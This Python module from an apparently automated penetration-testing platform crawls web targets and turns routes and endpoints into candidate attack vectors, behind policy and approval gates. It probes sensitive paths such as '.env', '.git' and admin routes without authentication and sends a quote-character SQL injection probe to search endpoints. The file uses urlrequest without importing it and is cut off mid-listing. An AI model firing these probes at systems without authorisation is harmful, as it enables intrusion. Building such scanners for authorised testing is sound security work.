from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import quote, urlencode, urljoin, urlparse

from secops.db import SessionLocal
from secops.execution.constants import DEFAULT_VALIDATION_CONFIG, ORACLE_ENDPOINT_MARKERS
from secops.models import (
    Action,
    AgentSession,
    ApprovalRequest,
    Artifact,
    Fact,
    Finding,
    OperatorNote,
    RunMessage,
    Task,
    WorkspaceRun,
)


class BrowserPhaseMixin:
    """Browser-assessment phase + HTTP/category validation helpers + small parsers.

    Extracted from ExecutionManager. This module is intentionally large (~2150 LOC):
    Phase 2 follow-ups (V25-03b/c) will split the validation halves into per-category
    verifiers registered against secops.verify.VerifierRegistry. Until then, the
    methods stay as instance helpers and continue to be called via ``self._method``
    by ``_phase_browser`` and (for parsing helpers) by other phase mixins.

    Relies on peer mixins for: ``self.events``, ``self.policies``, ``self.browser``,
    ``self.nas``, ``self._task_by_kind``, ``self._create_agent_session``,
    ``self._set_role_status``, ``self._set_vantix_task_status``,
    ``self._browser_candidate_urls``, ``self._http_request``,
    ``self._http_multipart_request``, ``self._write_http_artifact``,
    ``self._browser_vector``, ``self._validation_config``,
    ``self._high_risk_surfaces_config``, ``self._is_high_risk_surface``,
    ``self._normalize_risk_tags``, ``self._impact_bound_for_risk``,
    ``self._state_changed_for_risk``, ``self._append_validation_metadata``,
    ``self._emit_policy_decision``, ``self._create_approval``,
    ``self._write_memory``.
    """

    def _phase_browser(self, run_id: str) -> None:
        with SessionLocal() as db:
            run = db.get(WorkspaceRun, run_id)
            if run is None or not self._check_controls(db, run):
                return
            task = self._task_by_kind(db, run.id, "browser-assessment")
            if task.status == "completed":
                return
            paths = self.nas.for_workspace(run.workspace_id)
            session = self._create_agent_session(db, run.id, "browser", "Browser Analyst", paths)
            session.status = "running"
            self._set_role_status(db, run.id, "browser", "running")
            candidate_urls = self._browser_candidate_urls(run)
            target_url = candidate_urls[0] if candidate_urls else str(((run.config_json or {}).get("browser") or {}).get("entry_url") or run.target or "").strip()
            action_kind = "browser_assessment"
            decision = self.policies.evaluate(run, action_kind=action_kind)
            self._emit_policy_decision(
                db,
                run_id=run.id,
                action_kind=action_kind,
                verdict=decision.verdict,
                reason=decision.reason,
                audit=decision.audit,
            )
            if decision.verdict in {"block", "require_approval"}:
                task.status = "blocked"
                task.result_json = {"reason": decision.reason, "verdict": decision.verdict, "action_kind": action_kind}
                run.status = "blocked"
                session.status = "blocked"
                session.completed_at = datetime.now(timezone.utc)
                self._set_role_status(db, run.id, "browser", "blocked")
                self.events.emit(
                    db,
                    run.id,
                    "terminal",
                    f"[browser] blocked by policy: {decision.reason}",
                    level="warning",
                    payload={"agent": "browser", "action_kind": action_kind},
                    agent_session_id=session.id,
                )
                self._create_approval(
                    db,
                    run.id,
                    title="Browser assessment policy blocked run",
                    detail=decision.reason,
                    reason=f"{action_kind}-policy",
                    metadata={"target": target_url},
                )
                self._write_memory(
                    db,
                    run,
                    mode="handoff",
                    phase="browser-blocked",
                    issues=[decision.reason],
                    files=[str(paths.logs / "browser.log")],
                    next_action="review approval and retry",
                )
                db.commit()
                return

            browser_cfg = dict((run.config_json or {}).get("browser") or {})
            if browser_cfg.get("allow_auth") and (run.config_json or {}).get("browser_auth"):
                auth_decision = self.policies.evaluate(run, action_kind="browser_auth")
                self._emit_policy_decision(
                    db,
                    run_id=run.id,
                    action_kind="browser_auth",
                    verdict=auth_decision.verdict,
                    reason=auth_decision.reason,
                    audit=auth_decision.audit,
                )
                if auth_decision.verdict in {"block", "require_approval"}:
                    task.status = "blocked"
                    task.result_json = {"reason": auth_decision.reason, "verdict": auth_decision.verdict, "action_kind": "browser_auth"}
                    run.status = "blocked"
                    session.status = "blocked"
                    session.completed_at = datetime.now(timezone.utc)
                    self._set_role_status(db, run.id, "browser", "blocked")
                    self._create_approval(
                        db,
                        run.id,
                        title="Browser auth session requires approval",
                        detail=auth_decision.reason,
                        reason="browser_auth-policy",
                        metadata={"target": target_url},
                    )
                    db.commit()
                    return

            self.events.emit(
                db,
                run.id,
                "terminal",
                f"[browser] starting assessment: {target_url or '(none)'}",
                payload={"agent": "browser", "candidates": candidate_urls[:8]},
                agent_session_id=session.id,
            )
            # Release sqlite write locks before long-running browser runtime activity.
            # Without this commit, heartbeat lease-renew writes can starve and mark the phase stale.
            run_config_snapshot = dict(run.config_json or {})
            db.commit()
            best_result = None
            best_url = target_url
            best_score = -1
            for idx, url in enumerate((candidate_urls or [target_url])[:8], start=1):
                cfg = dict(run_config_snapshot or {})
                browser_cfg = dict(cfg.get("browser") or {})
                browser_cfg["entry_url"] = url
                cfg["browser"] = browser_cfg
                current = self.browser.assess(
                    run_id=run.id,
                    workspace_root=paths.root,
                    target=url,
                    run_config=cfg,
                    engagement_id=run.engagement_id,
                )
                score = (len(current.observations) * 10) + int(current.network_summary.get("total_requests") or 0) + len(current.route_graph)
                if score > best_score:
                    best_score = score
                    best_result = current
                    best_url = url
                if len(current.observations) > 0 and (len(current.route_graph) > 0 or int(current.network_summary.get("total_requests") or 0) > 3):
                    break
                if idx < len((candidate_urls or [target_url])[:8]):
                    self.events.emit(
                        db,
                        run.id,
                        "terminal",
                        f"[browser] candidate {url} yielded limited evidence; trying next target",
                        payload={"agent": "browser", "candidate": url},
                        agent_session_id=session.id,
                    )
            result = best_result if best_result is not None else self.browser.assess(
                run_id=run.id,
                workspace_root=paths.root,
                target=target_url,
                run_config=dict(run_config_snapshot or {}),
                engagement_id=run.engagement_id,
            )
            target_url = best_url
            config = dict(run.config_json or {})
            browser_cfg = dict(config.get("browser") or {})
            browser_cfg["entry_url"] = target_url
            config["browser"] = browser_cfg
            run.config_json = config
            screenshot_artifact_by_url: dict[str, str] = {}
            for item in result.artifacts:
                kind = str(item.get("kind") or "")
                path = str(item.get("path") or "")
                if not kind or not path:
                    continue
                artifact_row = Artifact(
                    run_id=run.id,
                    kind=kind,
                    path=path,
                    metadata_json={
                        "phase": "browser-assessment",
                        "agent_session_id": session.id,
                        "captured_at": result.completed_at,
                    },
                )
                db.add(artifact_row)
                db.flush()
                if kind == "screenshot":
                    url_key = str(item.get("url") or "")
                    if url_key:
                        screenshot_artifact_by_url[url_key] = artifact_row.id
            route_values: list[str] = []
            emitted_vectors: set[str] = set()
            for obs in result.observations:
                route_values.append(obs.url)
                db.add(
                    Fact(
                        run_id=run.id,
                        source="browser-runtime",
                        kind="route",
                        value=obs.url,
                        confidence=0.9,
                        tags=["browser", "route"],
                        metadata_json={
                            "title": obs.title,
                            "depth": obs.depth,
                            "dom_summary": obs.dom_summary,
                            "route_hints": obs.route_hints[:10],
                            "js_signal_kinds": [str(item.get("kind") or "") for item in obs.js_signals[:10]],
                        },
                    )
                )
                if obs.forms:
                    db.add(
                        Fact(
                            run_id=run.id,
                            source="browser-runtime",
                            kind="form",
                            value=obs.url,
                            confidence=0.82,
                            tags=["browser", "form"],
                            metadata_json={"forms": obs.forms[:20], "title": obs.title},
                        )
                    )
                    if any(bool(form.get("auth_like")) for form in obs.forms):
                        title = f"Auth boundary candidate at {obs.url}"
                        if title not in emitted_vectors:
                            emitted_vectors.add(title)
                            vector = self._browser_vector(
                                run_id=run.id,
                                title=title,
                                summary="Authentication-like form discovered; validate route guards and session transitions.",
                                severity="medium",
                                evidence=f"Route {obs.url} exposes auth-like form fields.",
                                tags=["browser", "auth-boundary"],
                                prerequisites=["authenticated session context"],
                                noise_level="quiet",
                                requires_approval=True,
                            )
                            db.add(vector)
                if obs.storage_summary:
                    db.add(
                        Fact(
                            run_id=run.id,
                            source="browser-runtime",
                            kind="browser-session",
                            value=obs.url,
                            confidence=0.7,
                            tags=["browser", "session"],
                            metadata_json=obs.storage_summary,
                        )
                    )
                    if int(obs.storage_summary.get("local_storage_keys") or 0) > 0 or int(obs.storage_summary.get("session_storage_keys") or 0) > 0:
                        title = f"Client-side session trust boundary candidate at {obs.url}"
                        if title not in emitted_vectors:
                            emitted_vectors.add(title)
                            db.add(
                                self._browser_vector(
                                    run_id=run.id,
                                    title=title,
                                    summary="Client storage or session state is present; validate trust boundaries and authorization coupling.",
                                    severity="medium",
                                    evidence=f"Observed local/session storage state on {obs.url}: {obs.storage_summary}",
                                    tags=["browser", "session-boundary"],
                                    prerequisites=["session validation"],
                                    noise_level="quiet",
                                    requires_approval=True,
                                )
                            )
                privileged_hints = [item for item in (obs.route_hints or []) if any(token in item.lower() for token in ("/admin", "/debug", "/manage", "/internal"))]
                if privileged_hints or any("admin" in link.lower() or "debug" in link.lower() for link in obs.links):
                    title = f"Hidden/admin surface candidate at {obs.url}"
                    if title not in emitted_vectors:
                        emitted_vectors.add(title)
                        shot_id = screenshot_artifact_by_url.get(obs.url)
                        vector = self._browser_vector(
                            run_id=run.id,
                            title=title,
                            summary="Discovered route links or inline route hints suggest privileged or debug surface exposure.",
                            severity="high",
                            evidence=f"Observed privileged route hints from {obs.url}: {(privileged_hints or obs.links)[:6]}",
                            tags=["browser", "admin-surface"],
                            prerequisites=["route validation"],
                            noise_level="quiet",
                            requires_approval=True,
                            evidence_artifact_ids=[shot_id] if shot_id else [],
                        )
                        db.add(vector)
                for hint in (obs.route_hints or [])[:20]:
                    db.add(
                        Fact(
                            run_id=run.id,
                            source="browser-runtime",
                            kind="browser-route-hint",
                            value=hint,
                            confidence=0.7,
                            tags=["browser", "route-hint"],
                            metadata_json={"page": obs.url, "title": obs.title},
                        )
                    )
                for signal in (obs.js_signals or [])[:20]:
                    signal_kind = str(signal.get("kind") or "unknown")
                    signal_text = str(signal.get("signal") or "").strip()
                    if not signal_text:
                        continue
                    db.add(
                        Fact(
                            run_id=run.id,
                            source="browser-runtime",
                            kind="js-signal",
                            value=f"{signal_kind}: {signal_text[:180]}",
                            confidence=0.68,
                            tags=["browser", "js-signal", signal_kind],
                            metadata_json={"page": obs.url, "kind": signal_kind, "signal": signal_text[:180]},
                        )
                    )
                    if signal_kind in {"app-config", "debug-signal"}:
                        title = f"Client trust boundary candidate at {obs.url}"
                        if title not in emitted_vectors:
                            emitted_vectors.add(title)
                            db.add(
                                self._browser_vector(
                                    run_id=run.id,
                                    title=title,
                                    summary="Client-side configuration or debug signal may expose internal trust assumptions or sensitive behavior.",
                                    severity="medium",
                                    evidence=f"Observed {signal_kind} signal on {obs.url}: {signal_text[:180]}",
                                    tags=["browser", "client-trust"],
                                    prerequisites=["configuration review", "bounded validation"],
                                    noise_level="quiet",
                                    requires_approval=True,
                                )
                            )

            if result.auth_transitions:
                db.add(
                    Fact(
                        run_id=run.id,
                        source="browser-runtime",
                        kind="browser-auth-transition",
                        value=result.authenticated,
                        confidence=0.8,
                        tags=["browser", "auth-state"],
                        metadata_json={
                            "transitions": result.auth_transitions[:10],
                            "dom_diffs": result.dom_diffs[:10],
                            "session_summary": result.session_summary,
                        },
                    )
                )
                if result.authenticated == "partial":
                    title = "Insecure state transition candidate"
                    if title not in emitted_vectors:
                        emitted_vectors.add(title)
                        db.add(
                            self._browser_vector(
                                run_id=run.id,
                                title=title,
                                summary="Authentication flow produced a partial session state; validate route guards, state transitions, and logout/login boundaries.",
                                severity="medium",
                                evidence=f"Browser auth transitions ended in partial state with {len(result.dom_diffs)} captured deltas.",
                                tags=["browser", "state-transition"],
                                prerequisites=["auth flow review"],
                                noise_level="quiet",
                                requires_approval=True,
                            )
                        )

            for endpoint in result.network_summary.get("endpoints", [])[:80]:
                value = str(endpoint.get("endpoint") or "").strip()
                if not value:
                    continue
                if not self._is_meaningful_endpoint(value):
                    continue
                db.add(
                    Fact(
                        run_id=run.id,
                        source="browser-runtime",
                        kind="api-endpoint",
                        value=value,
                        confidence=0.75,
                        tags=["browser", "api"],
                        metadata_json={"count": int(endpoint.get("count") or 0)},
                    )
                )
                endpoint_l = value.lower()
                endpoint_count = int(endpoint.get("count") or 0)
                endpoint_tokens = ("login", "auth", "admin", "password", "token", "search", "graphql", "config", "metrics", "upload", "reset")
                high_signal_tokens = ("admin", "auth", "password", "token", "config", "graphql")
                if any(token in endpoint_l for token in endpoint_tokens):
                    if endpoint_count < 2 and not any(token in endpoint_l for token in high_signal_tokens):
                        continue
                    title = f"API surface candidate: {value}"
                    if title not in emitted_vectors:
                        emitted_vectors.add(title)
                        severity = "high" if any(token in endpoint_l for token in high_signal_tokens) else "medium"
                        db.add(
                            self._browser_vector(
                                run_id=run.id,
                                title=title,
                                summary="Discovered browser-observed API endpoint requiring authorization and input validation checks.",
                                severity=severity,
                                evidence=f"Browser network summary observed endpoint pattern `{value}` with count={int(endpoint.get('count') or 0)}.",
                                tags=["browser", "api-endpoint"],
                                prerequisites=["authorization checks", "input validation checks"],
                                noise_level="quiet",
                                requires_approval=True,
                            )
                        )
            for route in route_values[:30]:
                route_l = route.lower()
                route_tokens = ("admin", "manage", "internal", "debug", "graphql", "swagger", "openapi")
                if any(token in route_l for token in route_tokens):
                    title = f"Route exposure candidate: {route}"
                    if title not in emitted_vectors:
                        emitted_vectors.add(title)
                        db.add(
                            self._browser_vector(
                                run_id=run.id,
                                title=title,
                                summary="Browser route discovery found an application path that warrants access-control and business-logic validation.",
                                severity="medium",
                                evidence=f"Browser discovered route `{route}`.",
                                tags=["browser", "route-surface"],
                                prerequisites=["route authorization validation"],
                                noise_level="quiet",
                                requires_approval=True,
                            )
                        )
            web_validation = self._browser_http_validations(
                base_url=target_url,
                network_endpoints=result.network_summary.get("endpoints", []),
                workspace_paths=paths,
            )
            category_validation = self._browser_category_validations(
                base_url=target_url,
                network_endpoints=result.network_summary.get("endpoints", []),
                workspace_paths=paths,
                strict_blackbox=self._is_black_box_run(run),
                validation_config=self._validation_config(run),
            )
            web_validation["findings"].extend(category_validation["findings"])
            web_validation["artifacts"].extend(category_validation["artifacts"])
            for check in category_validation.get("coverage_checks", []):
                check_id = str(check.get("id") or "").strip()
                if not check_id:
                    continue
                db.add(
                    Fact(
                        run_id=run.id,
                        kind="coverage_check",
                        value=check_id[:255],
                        source="browser-validation",
                        confidence=0.9 if str(check.get("status") or "") == "validated" else 0.75,
                        tags=["coverage", str(check.get("framework") or "custom"), str(check.get("status") or "inventory-reviewed")],
                        metadata_json={
                            "framework": str(check.get("framework") or ""),
                            "label": str(check.get("label") or ""),
                            "status": str(check.get("status") or "inventory-reviewed"),
                            "evidence": str(check.get("evidence") or "")[:500],
                            "source_phase": "browser-assessment",
                        },
                    )
                )
            for attempt in category_validation.get("validation_attempts", []):
                attempt_id = str(attempt.get("id") or attempt.get("title") or "").strip()
                if not attempt_id:
                    continue
                db.add(
                    Fact(
                        run_id=run.id,
                        kind="validation_attempt",
                        value=attempt_id[:255],
                        source="browser-validation",
                        confidence=0.9 if str(attempt.get("status") or "") == "validated" else 0.65,
                        tags=["validation", str(attempt.get("status") or "attempted"), *[str(tag) for tag in (attempt.get("risk_tags") or [])[:6]]],
                        metadata_json=dict(attempt),
                    )
                )
            if web_validation["findings"]:
                existing_titles = {
                    str(row[0]).strip().lower()
                    for row in db.query(Finding.title).filter(Finding.run_id == run.id).all()
                    if str(row[0] or "").strip()
                }
                for finding in web_validation["findings"]:
                    title = str(finding.get("title") or "").strip()
                    if not title or title.lower() in existing_titles:
                        continue
                    existing_titles.add(title.lower())
                    db.add(
                        Finding(
                            run_id=run.id,
                            title=title[:255],
                            severity=str(finding.get("severity") or "medium"),
                            status="validated",
                            summary=str(finding.get("summary") or "")[:2000],
                            evidence=str(finding.get("evidence") or "")[:4000],
                            reproduction=str(finding.get("reproduction") or "")[:4000],
                            remediation=str(finding.get("remediation") or "")[:4000],
                            confidence=float(max(0.0, min(0.99, float(finding.get("confidence") or 0.75)))),
                        )
                    )
                for artifact_path in web_validation["artifacts"]:
                    db.add(
                        Artifact(
                            run_id=run.id,
                            kind="http-validation",
                            path=artifact_path,
                            metadata_json={"phase": "browser-assessment"},
                        )
                    )
                db.add(
                    RunMessage(
                        run_id=run.id,
                        role="system",
                        author="System",
                        content=f"Browser validation checks produced {len(web_validation['findings'])} validated finding(s).",
                        metadata_json={"phase": "browser-assessment", "validated_count": len(web_validation["findings"])},
                    )
                )
            if result.network_summary.get("endpoints"):
                title = "Client-side/API mismatch candidate"
                if title not in emitted_vectors:
                    emitted_vectors.add(title)
                    vector = self._browser_vector(
                        run_id=run.id,
                        title=title,
                        summary="Browser-captured endpoints indicate API surface requiring authorization and trust-boundary validation.",
                        severity="medium",
                        evidence=f"Observed {len(result.network_summary.get('endpoints') or [])} API endpoint patterns in browser network capture.",
                        tags=["browser", "api-surface"],
                        prerequisites=["api authorization checks"],
                        noise_level="quiet",
                        requires_approval=True,
                    )
                    db.add(vector)

            if route_values:
                chain_payload = {
                    "name": "Browser recon to validation",
                    "score": min(99.0, 40.0 + float(len(route_values))),
                    "status": "candidate",
                    "steps": [
                        {"phase": "browser-assessment", "action": "route-discovery"},
                        {"phase": "planning", "action": "vector-selection"},
                    ],
                    "mitre_ids": ["T1595"],
                    "notes": f"Browser discovered {len(route_values)} in-scope routes and generated candidate vectors.",
                    "provenance": {"source": "browser-runtime", "route_count": len(route_values), "artifact_kinds": [item.get("kind") for item in result.artifacts]},
                }
                db.add(
                    Fact(
                        run_id=run.id,
                        source="browser-runtime",
                        kind="attack_chain",
                        value=chain_payload["name"],
                        confidence=0.72,
                        tags=["browser", "planning"],
                        metadata_json=chain_payload,
                    )
                )
            db.add(
                RunMessage(
                    run_id=run.id,
                    role="system",
                    author="System",
                    content=f"Browser vector generation: {len(emitted_vectors)} candidate vector(s) from browser evidence.",
                    metadata_json={"phase": "browser-assessment", "vector_count": len(emitted_vectors), "entry_url": target_url},
                )
            )

            session.status = "completed"
            session.completed_at = datetime.now(timezone.utc)
            self._set_role_status(db, run.id, "browser", "completed")
            task.status = "completed"
            task.result_json = {
                "entry_url": result.entry_url,
                "current_url": result.current_url,
                "authenticated": result.authenticated,
                "pages": len(result.observations),
                "routes": len(route_values),
                "network_requests": int(result.network_summary.get("total_requests") or 0),
                "blocked_actions": result.blocked_actions,
                "auth_transitions": len(result.auth_transitions),
                "dom_diffs": len(result.dom_diffs),
            }
            self._set_vantix_task_status(
                db,
                run.id,
                "browser-assessment",
                "completed",
                {"source_phase": "browser-assessment", "pages": len(result.observations), "routes": len(route_values)},
            )
            self.events.emit(
                db,
                run.id,
                "phase",
                f"Browser assessment completed: {len(result.observations)} pages, {len(route_values)} routes",
                payload={
                    "phase": "browser-assessment",
                    "entry_url": result.entry_url,
                    "authenticated": result.authenticated,
                    "blocked_actions": result.blocked_actions,
                },
                agent_session_id=session.id,
            )
            db.add(
                RunMessage(
                    run_id=run.id,
                    role="system",
                    author="System",
                    content=f"Browser assessment: pages={len(result.observations)}, routes={len(route_values)}, authenticated={result.authenticated}.",
                    metadata_json={"phase": "browser-assessment", "routes": len(route_values), "pages": len(result.observations)},
                )
            )
            self._write_memory(
                db,
                run,
                mode="phase",
                phase="browser-assessment",
                done=[f"browser pages={len(result.observations)}", f"routes={len(route_values)}"],
                files=[item["path"] for item in result.artifacts if item.get("path")][:10],
                next_action="cve analysis",
            )
            db.commit()

    def _browser_http_validations(self, *, base_url: str, network_endpoints: list[dict], workspace_paths) -> dict[str, list]:
        parsed = urlparse(str(base_url or ""))
        if not parsed.scheme or not parsed.netloc:
            return {"findings": [], "artifacts": []}
        origin = f"{parsed.scheme}://{parsed.netloc}"
        suspicious_tokens = (
            "admin",
            "config",
            "debug",
            "metrics",
            "swagger",
            "openapi",
            "graphql",
            "ftp",
            "backup",
            ".git",
            ".env",
            "internal",
        )
        static_suffixes = (".css", ".js", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2")
        candidate_paths: list[str] = []
        for row in (network_endpoints or []):
            endpoint = str((row or {}).get("endpoint") or "").strip()
            if not endpoint:
                continue
            if not self._is_meaningful_endpoint(endpoint):
                continue
            parts = endpoint.split(" ", 1)
            if len(parts) != 2:
                continue
            method, path = parts[0].upper(), parts[1].strip()
            if method != "GET" or not path.startswith("/"):
                continue
            lower = path.lower()
            if lower.endswith(static_suffixes):
                continue
            if any(token in lower for token in suspicious_tokens):
                candidate_paths.append(path)
        deduped_paths: list[str] = []
        seen_paths: set[str] = set()
        for path in candidate_paths:
            if path in seen_paths:
                continue
            seen_paths.add(path)
            deduped_paths.append(path)

        findings: list[dict] = []
        artifacts: list[str] = []
        out_dir = workspace_paths.artifacts / "http-validation"
        out_dir.mkdir(parents=True, exist_ok=True)
        for path in deduped_paths[:12]:
            url = f"{origin}{path}"
            req = urlrequest.Request(url=url, method="GET")
            try:
                with urlrequest.urlopen(req, timeout=6) as resp:
                    status = int(getattr(resp, "status", 0) or 0)
                    ctype = str(resp.headers.get("Content-Type", "")).lower()
                    raw = resp.read(1400)
            except urlerror.HTTPError as exc:
                status = int(exc.code or 0)
                ctype = str(exc.headers.get("Content-Type", "")).lower() if exc.headers else ""
                raw = b""
            except Exception:
                continue
            if status != 200:
                continue
            snippet = raw.decode("utf-8", errors="ignore")[:800]
            lower_path = path.lower()
            sev = "medium"
            if any(token in lower_path for token in ("admin", "config", "debug", ".git", ".env", "backup", "internal", "ftp")):
                sev = "high"
            if "metrics" in lower_path:
                sev = "medium"
            title = f"Unauthenticated sensitive endpoint exposure: GET {path}"
            summary = f"Endpoint `{path}` returned HTTP 200 without authentication."
            remediation = "Require authentication and authorization checks for sensitive endpoints and files."
            if "metrics" in lower_path:
                remediation = "Restrict metrics endpoints to trusted networks and authenticated monitoring identities."
            slug = re.sub(r"[^a-zA-Z0-9]+", "-", path).strip("-")[:90] or "root"
            artifact_path = out_dir / f"{slug}.txt"
            artifact_path.write_text(
                f"URL: {url}\nStatus: {status}\nContent-Type: {ctype}\n\nSnippet:\n{snippet}\n",
                encoding="utf-8",
            )
            artifacts.append(str(artifact_path))
            findings.append(
                {
                    "title": title,
                    "severity": sev,
                    "summary": summary,
                    "evidence": f"{url} returned HTTP 200 unauthenticated. Artifact: {artifact_path}",
                    "reproduction": f"GET {url} without authentication",
                    "remediation": remediation,
                    "confidence": 0.82 if sev == "high" else 0.74,
                }
            )
            # Generic SQL error-based probe for query/search style endpoints.
            if any(token in lower_path for token in ("search", "query", "filter")):
                probe_url = f"{origin}{path}{'&' if '?' in path else '?'}q=%27"
                req_probe = urlrequest.Request(url=probe_url, method="GET")
                try:
                    with urlrequest.urlopen(req_probe, timeout=6) as probe_resp:
                        probe_status = int(getattr(probe_resp, "status", 0) or 0)
                        probe_raw = probe_resp.read(1400)
                except urlerror.HTTPError as exc:
                    probe_status = int(exc.code or 0)
                    probe_raw = b""
                except Exception:
                    probe_status = 0
                    probe_raw = b""
                probe_text = probe_raw.decode("utf-8", errors="ignore")
                sql_markers = ("sql", "sqlite", "syntax error", "unterminated", "sequelize", "database error")
                if probe_status >= 500 or any(marker in probe_text.lower() for marker in sql_markers):
                    sql_artifact = out_dir / f"{slug}-sqli-probe.txt"
                    sql_artifact.write_text(
                        f"URL: {probe_url}\nStatus: {probe_status}\n\nSnippet:\n{probe_text[:900]}\n",
                        encoding="utf-8",
                    )
                    artifacts.append(str(sql_artifact))
                    findings.append(
                        {
                            "title": f"Potential injection flaw at {path}",
                            "severity": "high",
                            "summary": "Input containing SQL metacharacters caused server/database error behavior.",
                            "evidence": f"Probe `{probe_url}` returned status={probe_status} with SQL-error-like response markers.",
                            "reproduction": f"GET {probe_url} and inspect response for database syntax errors.",
                            "remediation": "Use parameterized queries, strict input handling, and generic error responses.",
                            "confidence": 0.86,
                        }
                    )
        return {"findings": findings, "artifacts": artifacts}

    def _browser_category_validations(
        self,
        *,
        base_url: str,
        network_endpoints: list[dict],
        workspace_paths,
        strict_blackbox: bool = False,
        validation_config: dict[str, Any] | None = None,
    ) -> dict[str, list]:
        parsed = urlparse(str(base_url or ""))
        if not parsed.scheme or not parsed.netloc:
            return {"findings": [], "artifacts": [], "coverage_checks": [], "validation_attempts": []}
        origin = f"{parsed.scheme}://{parsed.netloc}"
        endpoints = self._endpoint_paths(network_endpoints)
        out_dir = workspace_paths.artifacts / "http-validation"
        out_dir.mkdir(parents=True, exist_ok=True)
        validation_cfg = {**DEFAULT_VALIDATION_CONFIG, **(validation_config or {})}
        high_risk_cfg = self._high_risk_surfaces_config(validation_cfg)
        findings: list[dict] = []
        artifacts: list[str] = []
        validation_attempts: list[dict[str, Any]] = []
        seen_titles: set[str] = set()
        seen_attempts: set[str] = set()
        coverage_status_rank = {"not-reviewed": 0, "inventory-reviewed": 1, "active-probe": 2, "validated": 3}
        coverage_matrix: dict[str, dict[str, str]] = {
            "juice.broken_access_control": {"framework": "juice", "label": "Broken Access Control", "status": "inventory-reviewed", "evidence": "Route/API inventory reviewed for object and function-level authorization surfaces."},
            "juice.broken_anti_automation": {"framework": "juice", "label": "Broken Anti Automation", "status": "inventory-reviewed", "evidence": "Authentication and workflow endpoints reviewed for rate-limiting and anti-automation controls."},
            "juice.broken_authentication": {"framework": "juice", "label": "Broken Authentication", "status": "inventory-reviewed", "evidence": "Authentication/session flow reviewed across login and identity endpoints."},
            "juice.cryptographic_issues": {"framework": "juice", "label": "Cryptographic Issues", "status": "inventory-reviewed", "evidence": "Token and secret-handling surfaces reviewed through endpoint and response inspection."},
            "juice.improper_input_validation": {"framework": "juice", "label": "Improper Input Validation", "status": "inventory-reviewed", "evidence": "Input-bearing endpoints triaged for parser and validation behavior."},
            "juice.injection": {"framework": "juice", "label": "Injection", "status": "inventory-reviewed", "evidence": "Query/login/update/upload input vectors reviewed for injection opportunities."},
            "juice.insecure_deserialization": {"framework": "juice", "label": "Insecure Deserialization", "status": "inventory-reviewed", "evidence": "Upload/parser endpoints reviewed for unsafe parser behavior."},
            "juice.miscellaneous": {"framework": "juice", "label": "Miscellaneous", "status": "inventory-reviewed", "evidence": "General route and behavior inventory reviewed for non-category-specific challenge indicators."},
            "juice.observability_failures": {"framework": "juice", "label": "Observability Failures", "status": "inventory-reviewed", "evidence": "Metrics/log exposure surfaces reviewed during unauthenticated endpoint checks."},
            "juice.security_misconfiguration": {"framework": "juice", "label": "Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Configuration exposure and security-header posture reviewed."},
            "juice.security_through_obscurity": {"framework": "juice", "label": "Security through Obscurity", "status": "inventory-reviewed", "evidence": "Client-side route and artifact hints reviewed for hidden-interface reliance."},
            "juice.sensitive_data_exposure": {"framework": "juice", "label": "Sensitive Data Exposure", "status": "inventory-reviewed", "evidence": "Sensitive response fields and exposed files reviewed."},
            "juice.unvalidated_redirects": {"framework": "juice", "label": "Unvalidated Redirects", "status": "inventory-reviewed", "evidence": "Discovered redirect and callback-capable endpoints reviewed for URL trust flaws."},
            "juice.vulnerable_components": {"framework": "juice", "label": "Vulnerable Components", "status": "inventory-reviewed", "evidence": "Service/software/CVE inventory reviewed for component risk."},
            "juice.xss": {"framework": "juice", "label": "XSS", "status": "inventory-reviewed", "evidence": "Reflected/rendered input and callback surfaces reviewed for script execution paths."},
            "juice.xxe": {"framework": "juice", "label": "XXE", "status": "inventory-reviewed", "evidence": "XML upload/parser behavior reviewed for external entity processing."},
            "owasp2025.a01_broken_access_control": {"framework": "owasp2025", "label": "A01:2025 Broken Access Control", "status": "inventory-reviewed", "evidence": "Access-control surfaces reviewed across user/object/function endpoints."},
            "owasp2025.a02_security_misconfiguration": {"framework": "owasp2025", "label": "A02:2025 Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Configuration/header/docs/admin exposure reviewed."},
            "owasp2025.a03_supply_chain_failures": {"framework": "owasp2025", "label": "A03:2025 Software Supply Chain Failures", "status": "inventory-reviewed", "evidence": "CVE and component telemetry reviewed for vulnerable dependencies/services."},
            "owasp2025.a04_cryptographic_failures": {"framework": "owasp2025", "label": "A04:2025 Cryptographic Failures", "status": "inventory-reviewed", "evidence": "Credential/hash/token handling behavior reviewed."},
            "owasp2025.a05_injection": {"framework": "owasp2025", "label": "A05:2025 Injection", "status": "inventory-reviewed", "evidence": "Injection-capable inputs and parser endpoints reviewed."},
            "owasp2025.a06_insecure_design": {"framework": "owasp2025", "label": "A06:2025 Insecure Design", "status": "inventory-reviewed", "evidence": "Business-logic and privilege-workflow routes reviewed."},
            "owasp2025.a07_authentication_failures": {"framework": "owasp2025", "label": "A07:2025 Authentication Failures", "status": "inventory-reviewed", "evidence": "Login/session/recovery behavior reviewed."},
            "owasp2025.a08_data_integrity_failures": {"framework": "owasp2025", "label": "A08:2025 Software or Data Integrity Failures", "status": "inventory-reviewed", "evidence": "Update/upload and trust-boundary paths reviewed for integrity controls."},
            "owasp2025.a09_logging_alerting_failures": {"framework": "owasp2025", "label": "A09:2025 Security Logging and Alerting Failures", "status": "inventory-reviewed", "evidence": "Metrics/log exposure and observability behavior reviewed."},
            "owasp2025.a10_exception_handling": {"framework": "owasp2025", "label": "A10:2025 Mishandling of Exceptional Conditions", "status": "inventory-reviewed", "evidence": "Error behavior and exception leakage reviewed via malformed-input probes."},
            "api2023.api1_bola": {"framework": "owasp_api_2023", "label": "API1:2023 Broken Object Level Authorization", "status": "inventory-reviewed", "evidence": "Object-id endpoints reviewed for ownership enforcement."},
            "api2023.api2_broken_authentication": {"framework": "owasp_api_2023", "label": "API2:2023 Broken Authentication", "status": "inventory-reviewed", "evidence": "Authentication/session endpoints reviewed for bypass and token weaknesses."},
            "api2023.api3_bopla": {"framework": "owasp_api_2023", "label": "API3:2023 Broken Object Property Level Authorization", "status": "inventory-reviewed", "evidence": "Object property exposure/manipulation surfaces reviewed."},
            "api2023.api4_resource_consumption": {"framework": "owasp_api_2023", "label": "API4:2023 Unrestricted Resource Consumption", "status": "inventory-reviewed", "evidence": "Upload and parser endpoints reviewed for resource abuse behavior."},
